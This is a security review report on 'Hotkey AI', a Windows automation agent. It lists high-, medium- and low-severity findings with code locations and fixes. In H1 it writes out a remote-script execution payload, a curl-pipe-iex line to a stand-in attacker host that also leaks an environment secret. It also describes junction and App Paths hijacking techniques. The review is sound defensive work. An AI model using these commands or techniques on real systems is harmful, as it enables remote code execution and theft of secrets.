# Security and functionality review — 2026-08-17

Adversarial review of Hotkey AI at commit `4f94496` (`feature/dashboard-ui`). Written for
whoever picks up the fixes: every finding names the file and line, the control it defeats, and
what was actually observed rather than what was inferred.

**Scope.** Schema and policy validators, the executor and its safety controls, the
trust-on-first-use store, the Win32 layer (input, windows, processes, files, app resolution),
the agent's hotkey pump and the dashboard's write paths. Not covered: the WPF overlays'
rendering, `FuzzyMatcher`, the diff view.

**Baseline.** `dotnet build` clean, `dotnet test` 513/513 green before and after this review.
The working tree was left unchanged apart from the two files added under
`tools/security-review/`.

**How things were verified.** 37 adversarial plans through the real validator
(`tools/security-review/gen_adversarial_plans.py` + `run_adversarial_plans.ps1`), eight probe
tests against `PlanExecutor`/`FakeDesktop` and the policy layer, a live directory junction, a
`RegisterHotKey` ordering probe, and Win32 path-canonicalisation comparisons. Two hypotheses
were **disproved** by testing and are recorded as such below — the lexical path guard is
stronger than it looks.

---

## Findings at a glance

| # | Severity | Finding | Control defeated |
|---|----------|---------|------------------|
| H1 | High | Approval preview truncates `type_text`/`set_clipboard` at 60 chars | 4 — trust on first use |
| H2 | High | Allowed-roots containment is lexical; a junction inside the root reaches anywhere | 2 — allowlist |
| H3 | High | `SetHotkey` re-approves content it re-read from disk without re-checking the hash | 4 — trust on first use |
| H4 | High | An automation can shadow the panic key; reload failures are silent | 1 — panic abort |
| H5 | High | `app` resolution trusts HKCU `App Paths` and `PATH`, and skips the path guard | 2 — allowlist |
| M1 | Medium | `clipboard_matches` with an empty substring reports "(verified)" | honest verification |
| M2 | Medium | Dataflow check never looks inside `expect` or predicates | dataflow |
| M3 | Medium | Documented `foreach` scoping rule is not implemented (`loopScoped` is write-only) | dataflow |
| M4 | Medium | Regex-timeout catch filter is dead code — tests a private marker type | selector robustness |
| M5 | Medium | 120 s wall-clock cap is only checked *between* actions | 1 — panic abort |
| M6 | Medium | No password-field check, contrary to control 3's stated scope | 3 — sensitive window |
| M7 | Medium | Hazard checked once per action, not across `repeat` or a long `type_text` | 3 — sensitive window |
| M8 | Medium | `abort.reason` writes clipboard content verbatim into the on-disk log | 6 — never log secrets |
| M9 | Medium | `open_path` is an unrestricted ShellExecute anywhere under the root | 2 — allowlist |
| L1–L10 | Low | Validator asymmetry, log retention, doc/impl mismatches, error quality | assorted |

---

## High

### H1 — The approval preview truncates the payload it is meant to disclose

`src/HotkeyAI.Core/PlanRenderer.cs:161,177` render `type_text` and `set_clipboard` through
`Ellipsis(text, max: 60)` (`:334`). The executor then deliberately does not log the text
(`PlanExecutor.Actions.cs:229`, "contents not logged" — correct for control 6). Net effect: a
typed payload longer than 60 characters appears in full **nowhere** — not in the preview the
human approves, not in the transcript afterwards.

Observed, via `hotkeyai explain` on `t32-preview-truncation.json`:

```
2. [a2] Type "Meeting notes for the Tuesday standup, nothing to see here …" into the focused window
```

The plan actually types that text followed by
`&& curl http://attacker.example/x | iex ; $env:SECRET`. Paired with `focus_window` on a
terminal and `send_keys ENTER`, the approved-looking step is a remote-script execution. Plan
validates clean.

This matters more than the other findings because PLAN.md is explicit that the human seeing
the plan is *the* control that survives everything else ("the control that actually matters is
that a person reads the plan before it can run", `AutomationStore.cs:118-122`). Truncation
makes that control unsound by construction.

**Fix.** Never elide `type_text`/`set_clipboard` in the approval and diff surfaces. Wrap long
text across lines instead, and if a length cap is wanted for the compact row view, keep the
full text in the approval preview specifically. Consider also flagging a `type_text` that
contains newlines or shell metacharacters while a terminal is the focus target, since that is
the shape that turns typing into execution.

### H2 — Allowed-roots containment is purely lexical, so a reparse point walks out of it

`WindowsPath.Normalise`/`IsUnder` (`src/HotkeyAI.Core/Policy/WindowsPath.cs:51,107`) compare
strings, by design — the type's doc comment explains it avoids `System.IO.Path` so that Core
behaves identically on Linux CI and Windows. That reasoning is sound for `..` handling, but it
means neither the static check nor the runtime `PathGuard` (`Engine/Execution/PathGuard.cs:29`)
resolves symlinks or junctions.

Reproduced live. A directory junction created **without elevation** inside the allowed root:

```
sysjunction -> C:\Windows\System32
policy verdict for  …\scratchpad\sysjunction\cmd.exe : valid
what that path really is                            : Windows Command Processor
```

`tools/security-review/run_adversarial_plans.ps1` recreates this and cleans up after itself.

Threat model check: `AllowedRoots` is the whole user profile
(`src/HotkeyAI.Windows/AgentStore.cs:31-34`), so an approved plan can already launch anything
inside the profile. What this adds is (a) reach outside the profile, and (b) more importantly, a
**rendered preview that lies** — the approval text shows an innocuous in-profile path while the
launch lands in System32. That is the same failure as H1 by a different route.

**Fix.** After the lexical check passes, resolve the final target in the Windows layer —
`File.ResolveLinkTarget(path, returnFinalTarget: true)`, or `GetFinalPathNameByHandle` for full
fidelity — and re-run containment on the resolved value before launching, opening, or listing.
Core keeps the lexical rule (and its Linux tests); `WindowsFiles`/`WindowsProcesses` add the
resolution step. Report a refusal that names the real target, because "this path is a junction
to System32" is exactly what the user needs to see.

### H3 — `SetHotkey` re-grants approval to content it never verified

`src/HotkeyAI.Agent/DashboardHost.cs:590-630`:

1. `:590` loads the automation and `:599` records `wasApproved` from that snapshot.
2. `:604` **re-reads the file from disk** — which may no longer be the content whose approval
   status was just checked.
3. `:607-613` edits `trigger.keys` and writes the file back.
4. `:620-628` re-approves whatever was written, because `wasApproved` was true.

The comment at `:576-577` claims "The approval is re-granted only because this code made the
edit and knows it touched nothing else." It does not know that: nothing between the status
check and the read establishes that the bytes are still the approved bytes. An attacker who can
write the automations folder — precisely the dropper that control 4 exists for — can swap an
approved plan's body and win the race on the next rebind, and the malicious body is signed
without the user ever seeing it.

The non-racing variant is safe (a swapped file reads as `Changed`, so `wasApproved` is false),
which is why this is a race rather than a straight bypass. It is still cheap to close.

**Fix.** After `File.ReadAllText`, assert `AutomationStore.HashOf(content) ==
automation.ContentHash` before editing; on mismatch, abort and tell the user the file changed
underneath. Better still, apply the trigger edit to the already-loaded content rather than
re-reading, so there is only one version of the truth.

### H4 — The panic key can be shadowed by an automation, and reload failures are silent

Three separate gaps compose:

1. **Ordering.** `AgentHost.StartAsync` registers every automation's chord at `:133`, then the
   panic chord at `:138`. `RegisterHotKey` is first-come-first-served — proved directly:

   ```
   first  caller for Ctrl+Alt+Shift+F10 : True  (registered)
   second caller for the same chord     : False (err 1409 ERROR_HOTKEY_ALREADY_REGISTERED)
   ```

2. **Nothing rejects the panic chord as a trigger.** `HotkeyChord.Problems`
   (`src/HotkeyAI.Core/Dsl/HotkeyChord.cs:23`) checks modifier count and duplicates only.
   `t01-panic-chord.json` — trigger `CTRL+ALT+SHIFT+ESC` — validates clean.
   Meanwhile `DashboardHost.CheckHotkey:523` *does* refuse the panic chord when captured in the
   UI. So the rule exists in exactly one of the two places, which is the drift
   `HotkeyChord`'s own doc comment says the type was extracted to prevent.
   Hand-authored JSON is V1's primary authoring path, so the gap is on the main road.

3. **Silent failure on reload.** `AgentHost.Reload:335` calls `host.Register("__panic",
   PanicChord)` and discards the result — no log line, no tray warning. Startup reports it
   loudly (`:139-142`), but every folder change, dashboard rebind, and `Suspend()` restore goes
   through `Reload`. The tray menu also offers no Stop command, so with the panic key gone the
   keyboard has no abort at all.

**Fix.** Register the panic chord *first*, before any automation. Move the panic-chord rule into
`HotkeyChord.Problems` so the validator, the CLI and the dashboard share it. Report the panic
registration result from `Reload` the same way startup does, and add a "Stop running automation"
item to the tray menu as a mouse-reachable fallback.

### H5 — Logical `app` names resolve through user-writable sources and skip the path guard

`PlanExecutor.Actions.cs:115-126`: when a plan names `app`, the resolved executable goes
straight to `LaunchAsync` — `pathGuard.IsAllowed` is only applied on the `path` branch
(`:132`). Resolution order in `src/HotkeyAI.Windows/AppResolver.cs:146-162` reads
`HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\<exe>` **before**
HKLM, then falls back to `PATH` (`:164-189`).

Both HKCU and the user's `PATH` are writable by any process running as the user. So malware
points `App Paths\notepad.exe` at its own binary, and an automation the user approved months
ago — rendered as "Launch notepad" — now launches the attacker's executable, with no path check
and nothing in the preview or the log to show it.

The file's own comment says `PATH` is placed last because "anything can put an executable on
it". HKCU deserves the same suspicion, and currently gets the opposite: first place.

**Fix.** Prefer HKLM over HKCU for `App Paths`. Constrain resolution results to a set of
trusted roots (`%ProgramFiles%`, `%ProgramFiles(x86)%`, `%WINDIR%`,
`%LOCALAPPDATA%\Programs`, `%LOCALAPPDATA%\Microsoft\WindowsApps`) and refuse anything else with
a message naming what it resolved to. Log the resolved executable path on launch so the
transcript records what actually ran, and show it in the approval preview.

---

## Medium

### M1 — A postcondition can report "(verified)" while verifying nothing

`PlanExecutor.cs:283-295`. `Matches` falls back to `actual.Contains(contains)`, and
`Interpolate` renders an unset variable as the empty string
(`Engine/Execution/Variables.cs:86-88`) — so `contains: "${ghost}"` becomes
`actual.Contains("")`, which is always true.

Probe output:

```
[a1] set_clipboard: Succeeded (verified) - Clipboard set.
```

The clipboard held `"totally unrelated payload"`; the plan claimed verification against a
variable that was never written. This is the one failure mode the engine's honesty story cannot
absorb — the whole point of `UnverifiedCount` is that "it ran" and "it worked" stay distinct,
and here a vacuous check upgrades the weaker claim to the stronger one.

**Fix.** Treat an empty `contains` after interpolation as a failed postcondition, not a passed
one, and say why. Same reasoning for a `path_exists` expectation whose path interpolates to
empty (currently caught by the path guard, but by accident rather than intent).

### M2 — The dataflow check never looks inside `expect` or predicates

`PolicyValidator.References` reflects over an action's own properties, and `Strings`
(`:503-513`) handles only `string`, `IEnumerable<string>` and `WindowSelector`. Nested
`Postcondition` and `Condition`/`SimplePredicate` objects fall through to `[]`, so any
`${...}` inside them is invisible to the declaration and assignment checks.

Both confirmed accepted with `${ghost}` undeclared:

```
expect-layer valid=True, predicate-layer valid=True
```

This is what makes M1 reachable from a plan that passes validation, and it is a false negative
in exactly the layer whose comment says reflection was chosen over a switch because "a missed
case is a silent false negative".

**Fix.** Extend `Strings` to recurse into `Postcondition`, `Condition`, `SimplePredicate` and
`WindowSelector` (the last is already special-cased — generalise it). A reflective walk over
nested DSL record types would cover future primitives automatically, which is the property the
current design was reaching for.

### M3 — The documented `foreach` scoping rule does not exist

`PolicyValidator.cs:291` creates `loopScoped`, `:390` adds to it, and nothing ever reads it.
The doc comment at `:270-274` states the rule plainly: "A `foreach` item variable is the
exception: it exists only inside the loop, so reading it afterwards is always wrong." The
executor honours it at run time (`PlanExecutor.Actions.cs:409` clears the variable), so the
plan silently interpolates an empty string instead of being rejected.

`t04-loop-var-escapes.json` validates with 0 errors.

**Fix.** Check reads against `loopScoped` in `CheckDataflow`, and report the pointer of the
offending read. Add a corpus case, since this is a rule the docs promise.

### M4 — The regex-timeout guard is dead code

`src/HotkeyAI.Windows/WindowsWindows.cs:194`:

```csharp
catch (Exception ex) when (ex is ArgumentException or RegexMatchTimeoutMarker)
```

`RegexMatchTimeoutMarker` is a private nested class declared at `:211` and **never thrown
anywhere in the repo** (grepped). The real exception is
`System.Text.RegularExpressions.RegexMatchTimeoutException`, which derives from
`TimeoutException`:

```
PROBE3 threw System.Text.RegularExpressions.RegexMatchTimeoutException
PROBE3 is ArgumentException = False, is TimeoutException = True
```

So a catastrophic `titleRegex` escapes `Matches`, escapes `FindAsync` mid-enumeration
(discarding any window already matched), and surfaces as a failed action with a raw exception
message. Compounding it: the 250 ms budget is *per window*, and `Enumerate()` runs over every
visible top-level window on every call, so a `wait_for_window` polling at 150 ms with
`timeoutMs: 300000` multiplies that cost for five minutes. `t18-redos-regex.json` validates
clean.

**Fix.** Catch `RegexMatchTimeoutException` (delete the marker class). Better: compile the
pattern once per find with a timeout and treat a timeout as "this selector is too expensive"
— a distinct, reportable failure rather than a silent non-match. Consider validating
`titleRegex` in the policy layer with a cheap catastrophic-backtracking heuristic, or capping
pattern length.

### M5 — The wall-clock cap is only checked between actions

`PlanExecutor.CheckLimits:134` evaluates `run.Elapsed > limits.MaxDuration` before each action,
never during one. A single action can therefore run for its own `timeoutMs`, bounded by policy
at 300 000 ms — 2.5× the documented 120 s cap.

Probe, with `MaxDuration` set to 50 ms and one 30 s `wait`:

```
PROBE6 MaxDuration=50ms, actual elapsed=3010ms   (only my 3s external token stopped it)
```

The panic key still works (cancellation is cooperative and `Task.Delay` honours the token), so
the user can escape. What is missing is the engine's own escape hatch, which PLAN.md describes
as being there "for when the user cannot get to the keyboard".

**Fix.** Derive each action's effective timeout as `min(action.timeoutMs, remaining budget)` and
link a run-level `CancellationTokenSource(MaxDuration)` into the per-action linked source, so
the cap bounds the run rather than the gaps between steps.

### M6 — Control 3 claims a password-field check that does not exist

PLAN.md control 3: refuse input if the foreground window "is a UAC consent dialog, a credential
prompt, **or a control with the password style**". `WindowsInput.CheckHazardAsync:52-80` checks
only two window class names (`Credential Dialog Xaml Host`, `ConsentUI`) plus the integrity
comparison. There is no `ES_PASSWORD` check and no UIA `IsPassword` check.

Removing `#32770` from the class list was the right call and the comment explains why well. But
the consequence is that the remaining coverage is narrow: a browser password field, a password
manager's master-password box, and any WPF/WinForms/Electron password input are all
unprotected, and those are where a real credential actually sits.

**Fix.** Add `GetGUIThreadInfo` → `hwndFocus` → `GetWindowLong(GWL_STYLE) & ES_PASSWORD` for
Win32 controls, and the UIA `IsPassword` property for XAML/WPF/Electron. Until that ships,
amend PLAN.md so the control's stated scope matches the code — a control described more broadly
than it is implemented is worse than a narrow control honestly described.

### M7 — The hazard check happens once per action, not across the input it emits

`PlanExecutor.Actions.cs:200-230` calls `BlockedAsync` once, then hands the whole operation to
the Windows layer. Inside, `WindowsInput.SendChordAsync:82-117` loops up to `repeat` (policy max
50) times, and `TypeTextAsync:119-145` sends one character every 5 ms — a 2 000-character
payload occupies the foreground for ten seconds after a single check.

Anything that takes focus in that window receives the remainder: a UAC prompt appearing, an
elevation dialog, the user alt-tabbing to their password manager. `Send` does throw on a short
count (`:208-216`), which catches UIPI rejection — but only when Windows rejects the input, not
when a benign-but-wrong window accepts it.

**Fix.** Capture the foreground `HWND` at the start of the action and abort if it changes;
re-run `CheckHazardAsync` every N characters and between repeats. Pass a hazard callback into
the Windows layer, or move the loop up into the executor so the existing check point is hit each
iteration.

### M8 — `abort.reason` writes clipboard content straight into the on-disk log

`PlanExecutor.Actions.cs:94-97` interpolates the abort reason and returns it as the step detail,
which becomes a `LogEntry.Detail`, the transcript, `AgentLog.Raw` output in
`%LOCALAPPDATA%\HotkeyAI\logs\agent-*.log`, and the repair prompt. Confirmed:

```
[a1] get_clipboard: Succeeded (unverified) - Read 30 character(s) from the clipboard.
[a2] abort: Aborted - bailing out with AKIAIOSFODNN7EXAMPLE / hunter2
FAILED: bailing out with AKIAIOSFODNN7EXAMPLE / hunter2
```

`get_clipboard` and `type_text` are carefully redacted; `abort` is the hole in the same control,
and it lands in the file PLAN.md expects users to paste into repair prompts by hand. `notify`
was checked too and is clean (message not logged).

Related, by inspection: `show_picker` logs the selected path (`:347`) and every window action
logs the window title (`:195`). Those are the paths and titles PLAN.md item 7 flags as
PII/confidential-adjacent under SOC2/ISO 27001.

**Fix.** Render the abort reason for the user (toast/UI) but log the *template*, not the
interpolated value — or redact any interpolated segment whose source variable was written by
`get_clipboard` or `show_input`. Tracking which variables carry user-derived data is cheap:
`Variables` already knows who wrote each value.

### M9 — `open_path` is an unrestricted ShellExecute across the whole user profile

`src/HotkeyAI.Windows/WindowsFiles.cs:27-39` starts the path with `UseShellExecute = true` and
no extension policy. The comment argues it is "safe here precisely because the path was already
checked" — but the check is "somewhere under `%USERPROFILE%`", which includes `Downloads`,
`AppData\Local\Temp`, and every other directory a browser or another process can drop a file
into.

The amplifying shape validates clean (`t11-open-everything.json`): `list_files` over
`Downloads` with pattern `*`, then `foreach` → `open_path ${f.fullPath}`. An automation approved
as "open my downloads" executes whatever an attacker put there. `open_path` on an explicit
`.exe` also validates (`t10`).

**Fix.** Give `open_path` an extension policy — refuse `.exe .com .bat .cmd .ps1 .psm1 .vbs .js
.jse .wsf .wsh .hta .msi .msp .scr .cpl .reg .lnk .url .pif` and anything else Windows treats as
executable — and say so in the schema description, since that text is prompt material. Consider
excluding `Temp` and `Downloads` from the default roots, or narrowing the default root from the
whole profile to a configured list.

---

## Low

| # | Finding | Where |
|---|---------|-------|
| L1 | Policy layer checks literal paths **only** on `launch_process.path`. Out-of-root literals on `open_path`, `list_files`, `list_directories`, `path_exists`, `workingDirectory` and `expect.path_exists` all validate clean and fail only at run time — approvable plans that can never work. The runtime guard holds, so this is a usability and honesty gap, not a hole. | `PolicyValidator.cs:186-243` |
| L2 | Logs accumulate window titles and file paths in plain text, one file per day, with no rotation, retention or redaction. PLAN.md item 7 flags exactly this data as PII/confidential-adjacent; nothing implements it. | `AgentLog.cs`, `AgentPaths.cs:40` |
| L3 | `terminate_process` prompts on **every** run; control 5 says "prompt on first use per automation, remembered thereafter". Stricter than documented, but prompt fatigue trains users to click through. Also the prompt does not say how many processes match, while `TerminateAsync` kills all of them with `entireProcessTree: true`. | `PlanExecutor.Actions.cs:156-175`, `WindowsProcesses.cs:65-101` |
| L4 | A number outside int32 range reports "This is a defect in Hotkey AI, not in the plan." — misattributed, since the schema's `integer` has no range. (Also a doubled full stop in that message.) | `PlanValidator.cs:31-41` |
| L5 | `oneOf` branch noise reaches users: an action with an unknown field also reports `Required properties ["path"] are not present` and `All values fail against the false schema`. Exceeding the nesting limit reports three messages, none of which mentions nesting. | `SchemaValidator.cs:388-399` |
| L6 | The dashboard's Stop button produces "Stopped by the panic key." — the reason is hardcoded for any cancellation, and the transcript is what gets pasted into repair prompts. | `PlanExecutor.cs:80` |
| L7 | Control 4 specifies a per-user ACL on the store. `%LOCALAPPDATA%` inherits one by default, but nothing sets or asserts it, so the control is implicit and untested. | `AgentPaths.cs:15`, `DpapiApprovalStorage.cs:53-71` |
| L8 | `Integrity.LevelOf` computes `8 + ((subAuthorities - 1) * 4)` without guarding `subAuthorities == 0`, reading a bogus offset from a malformed SID. | `Integrity.cs:54-81` |
| L9 | `Enumerate()` calls `Integrity.IsHigherThanUs` (three syscalls) and `Process.GetProcessById` for **every** visible window on every find — including each 150 ms poll of a `wait_for_window` that may run for 300 s. `IsElevated` is computed whether or not the caller needs it. | `WindowsWindows.cs:135-165` |
| L10 | `RunAsync`'s generic-exception path calls `run.Stop(...)` without writing a `LogEntry`, so the transcript ends with no line explaining why. The cancellation path does log one. | `PlanExecutor.cs:85-90` |
| L11 | An automation with `actions: []` validates and binds a global chord that does nothing. Worth a warning at minimum. | `t23-no-actions.json` |

---

## What held up under attack

Worth recording, because these are the parts not to churn:

- **Lexical path traversal.** Six evasion shapes — `..`, `...`, `.. ` (trailing space), a
  trailing-dot directory component, `\\?\` device paths, UNC, mixed separators, and an embedded
  NUL — were compared against `Path.GetFullPath` on Windows 11. Every one either was rejected or
  resolved to the same place the guard thought it would. My hypothesis that Win32 per-segment
  trailing-space trimming would diverge from `WindowsPath.Normalise` was **wrong**; modern .NET
  treats `.. ` as a literal name, exactly as `Normalise` does. The `..`-above-root refusal is
  correct and the whole-segment comparison stops the `C:\Projects-Secret` class of bug.
- **`argv` is genuinely not a command line.** `UseShellExecute = false` plus `ArgumentList`
  (`WindowsProcesses.cs:20-42`) means a variable containing shell metacharacters is inert. The
  DSL's "no shell primitive" claim survives — the residual risk is `app: powershell` with
  `argv`, and the preview discloses that fully (`Launch powershell with -NoProfile
  -EncodedCommand …`), which is the right trade.
- **`Slug` cannot escape the automations folder.** `DashboardHost.cs:680-699` is a
  letters-and-digits allowlist with an `"automation"` fallback, so a plan named `../../evil`
  cannot direct a write outside the folder.
- **Approval fails in the safe direction.** A corrupt or foreign-profile DPAPI blob reads as
  empty, making everything inert (`DpapiApprovalStorage.cs:45-50`). A hotkey press runs the
  in-memory plan captured at load (`AgentHost.cs:170-181`), so there is no read-time TOCTOU
  between approval and execution — the H3 race is in the rebind path only.
- **The panic source is per-run**, not a long-lived one that stays cancelled
  (`AutomationRunner.cs:41-74`) — the failure mode its comment describes is real and avoided.
- **Allowlist validation is solid** where it applies: unknown action types, unknown fields,
  both-`app`-and-`path`, duplicate ids, chord shape, nesting depth, and all seven numeric bounds
  are rejected with pointers. All 78 `KeyName` values have virtual-key mappings, so no chord
  silently sends VK 0.
- **The single-run gate and the observer isolation** are both correct, and the reasons given in
  the comments match what the code does.

---

## Reproducing this

```powershell
dotnet build src/HotkeyAI.Cli
python tools/security-review/gen_adversarial_plans.py C:\temp\adversarial
pwsh tools/security-review/run_adversarial_plans.ps1 C:\temp\adversarial
```

`manifest.tsv` carries, per case, the control it attacks, the verdict it *should* get, and the
verdict observed on 2026-08-17 — so after a fix, re-running and diffing the two columns shows
what moved. Edit `HOME` in the generator to match the machine's profile. The runner also creates
and removes the junction for H2.

The eight probe tests used for the runtime findings (M1–M5, M8, and the H4 hotkey ordering) were
written against `FakeDesktop` in `tests/HotkeyAI.Engine.Tests` and deliberately **not**
committed: as written they assert the buggy behaviour, which would lock it in. Each finding
above states the exact observation, so they can be rewritten as regression tests with inverted
assertions as part of the fix.

## Suggested order of work

1. **H1 and H2 first.** Both make the approval preview untrustworthy, and everything else in the
   safety model is built on the assumption that it is not.
2. **H4**, because it is three small, independent, low-risk edits.
3. **H3 and H5**, both narrow and cheap.
4. **M1 + M2 together** — same root cause (interpolation of an unwritten variable), and M2's fix
   is what makes M1 unreachable from a validated plan.
5. **M3, M4, M5** — small, well-defined, each wants a test.
6. **M6 and M7** need Win32 work; until then, correct PLAN.md's claim so the documented scope
   matches the implemented one.
7. **M8, M9, then the Low list.**

Two documentation edits are worth making regardless of scheduling, because the docs currently
overstate the code: control 3's password-style check (M6) and control 5's "remembered
thereafter" (L3).
